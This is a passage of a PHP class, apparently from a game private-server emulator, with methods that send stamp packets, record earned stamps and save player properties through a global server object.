      if(!$func_stamps) return; // TODO: Error report.
      $this->sendPacket("%xt%gps%-1%{$func_playerId}%{$func_stamps}%");
    }
    
    public function sendStampEarned($func_stampId) {
      $func_stamps = $this->playerStamps == '' ? array() : explode('|', $this->playerStamps);
      $func_stamps[] = (string)(integer)$func_stampId;
      $this->updateProperty('playerStamps', join('|', array_unique($func_stamps)));
    }
    
    # # # # # # #
    # TODO-AREA #
    # # # # # # #
    
    public function updateProperty($func_name, $func_value) {
      $this->$func_name = $func_value;
      if($this->isTryout) return false;
      
      global $SERVER;
      return $SERVER->updateUserProperty($this->playerId, $func_name, $func_value);
    }
  }
  
  // TODO: Get rid of updateUserProperty in methods other than 'updateProperty´

?>